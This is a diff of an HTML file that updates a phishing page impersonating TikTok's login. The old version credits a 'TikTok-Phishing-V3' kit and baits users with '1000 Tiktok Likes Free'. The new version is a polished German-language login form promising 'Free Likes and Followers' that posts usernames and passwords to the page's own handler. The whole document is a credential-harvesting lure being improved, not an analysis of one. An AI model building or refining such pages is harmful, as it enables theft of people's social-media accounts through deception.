@@ -1,60 +1,133 @@
 <!DOCTYPE html>
-<html>
-<!-- Powered By SADFLIX  -->
-<!-- COPIED FROM https://github.com/swagkarna/TikTok-Phishing-V3/blob/main/tiktokv3.zip -->
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Tik Tok Followers</title>
-<script src="jquery.min.js"></script>
-<script src="jscript.js"></script>
-<link rel="stylesheet" type="text/css" href="style.css">
-<style>
-    @media(max-width:760px){
-       #TFG{
-           font-size:140%;
-       } 
-       .buttonstyle{
-           font-size:100%;
-       }
-    
-    .followers , .likes{
-        width:95%;
-    }
-    }
-</style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: linear-gradient(135deg, #fe2c55, #03a9f4);
+            margin: 0;
+        }
+
+        .login-container {
+            background-color: white;
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
+            width: 350px;
+            text-align: center;
+            animation: fadeIn 1s ease-in-out;
+        }
+
+        .login-container h2 {
+            font-size: 2rem;
+            margin-bottom: 20px;
+            color: #000;
+            font-weight: bold;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+
+        .input-field:focus {
+            border-color: #fe2c55;
+            outline: none;
+        }
+
+        .login-button {
+            width: 100%;
+            padding: 12px;
+            background-color: #fe2c55;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .login-button:hover {
+            background-color: #d21e47;
+        }
+
+        .forgot-password,
+        .sign-up {
+            display: block;
+            margin-top: 15px;
+            color: #03a9f4;
+            text-decoration: none;
+            font-size: 14px;
+            transition: color 0.3s ease;
+        }
+
+        .forgot-password:hover,
+        .sign-up:hover {
+            color: #fe2c55;
+        }
+
+        .signup-link {
+            font-size: 14px;
+        }
+
+        /* New Section for "Free Likes and Followers" */
+        .free-info {
+            margin-top: 20px;
+            font-size: 18px;
+            color: #fff;
+            font-weight: bold;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.4);
+            letter-spacing: 1px;
+            animation: slideIn 1s ease-in-out;
+        }
+
+        @keyframes fadeIn {
+            0% { opacity: 0; transform: scale(0.9); }
+            100% { opacity: 1; transform: scale(1); }
+        }
+
+        @keyframes slideIn {
+            0% { transform: translateY(20px); opacity: 0; }
+            100% { transform: translateY(0); opacity: 1; }
+        }
+
+    </style>
 </head>
-<body onload="updateyear()">
-</div>
-<div id="main-tool">
-	<div class="wrapper"><img src="logo.png"></div>
-	<h1 id="TFG">Login</h1>
-<p class="sub-heading">Login to get 1000 Tiktok Likes Free</p>
+<body>
 
-    <form action="login.php" method="POST">
-    <center>
-    <div id="fillup">
-        <div class="form-option">
-        	<input name="email" class="input-form input-command" type="text" placeholder="Username/Email/Phone" required>
-        </div>
-    <div id="fillup">
-        <div class="form-option">
-        	<input name="password" class="input-form input-command" type="password" placeholder="Password" required>
-        </div>
-
-        <br><br>
-        <button class="buttonstyle"><b>Login</b></button>
-        </center>
-
+<div class="login-container">
+    <h2>TikTok</h2>
+    <form action="/login" method="post">
+        <input type="text" name="username" class="input-field" placeholder="Benutzername oder E-Mail" required>
+        <input type="password" name="password" class="input-field" placeholder="Passwort" required>
+        <button type="submit" class="login-button">Einloggen</button>
+    </form>
+    <a href="#" class="forgot-password">Passwort vergessen?</a>
+    <a href="#" class="sign-up">Erstelle ein neues Konto</a>
+    
+    <!-- Free Likes and Followers Text -->
+    <div class="free-info">
+        Free Likes and Followers
     </div>
 </div>
 
-<div id="steps" style="display:none;">
-
-</div>
-
-<div id="comment" style="display:none;" >
-</div>
 </body>
-<!-- Powered By Sadflix -->
 </html>
